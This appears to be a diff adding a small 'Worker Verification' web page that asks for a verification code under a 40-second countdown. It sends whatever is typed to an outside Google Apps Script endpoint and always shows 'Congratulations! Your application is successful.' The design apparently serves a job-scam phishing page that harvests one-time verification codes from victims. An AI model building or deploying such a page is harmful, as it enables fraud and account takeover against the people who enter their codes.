@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Worker Verification</title>
+
+<style>
+
+body{
+font-family:Arial;
+background:#f5f5f5;
+text-align:center;
+padding-top:50px;
+}
+
+.container{
+background:white;
+padding:20px;
+margin:auto;
+width:90%;
+max-width:350px;
+border-radius:10px;
+box-shadow:0 0 10px rgba(0,0,0,0.1);
+}
+
+input{
+width:90%;
+padding:12px;
+margin-top:15px;
+font-size:16px;
+}
+
+button{
+padding:12px 20px;
+margin-top:20px;
+font-size:16px;
+background:green;
+color:white;
+border:none;
+border-radius:5px;
+}
+
+#message{
+margin-top:20px;
+font-size:18px;
+font-weight:bold;
+}
+
+#timer{
+color:red;
+font-size:20px;
+margin-top:10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Enter verification code:</h2>
+
+<div id="timer">
+Time Left: 40 seconds
+</div>
+
+<input type="text" id="workerCode"
+placeholder="Code">
+
+<br>
+
+<button onclick="finishProcess()">
+Submit
+</button>
+
+<div id="message"></div>
+
+</div>
+
+<script>
+
+let timeLeft = 40;
+
+const countdown = setInterval(() => {
+
+timeLeft--;
+
+document.getElementById("timer").innerHTML =
+"Time Left: " + timeLeft + " seconds";
+
+if(timeLeft <= 0){
+
+clearInterval(countdown);
+
+alert("Time is up! Returning to start.");
+
+location.reload();
+
+}
+
+},1000);
+
+const scriptURL = "https://script.google.com/macros/s/AKfycbwxAMROcnuKVwuZX4YMYAzY30xD--ZbCslHVseptRwOHz_hAFQZhypCAItxEwhKKqVtig/exec";
+
+function finishProcess(){
+
+let code =
+document.getElementById("workerCode").value;
+
+if(code !== ""){
+fetch(scriptURL, {
+  method: "POST",
+
+  body: JSON.stringify({
+    type: "secondPage",
+    code: code
+  })
+
+});
+document.getElementById("message").innerHTML =
+"🎉 Congratulations! Your application is successful.";
+
+clearInterval(countdown);
+
+document.querySelector("button").disabled = true;
+
+document.getElementById("workerCode").disabled = true;
+
+}else{
+
+document.getElementById("message").innerHTML =
+"❌ Please enter verification code.";
+
+}
+
+}
+
+</script>
+
+</body>
+</html>
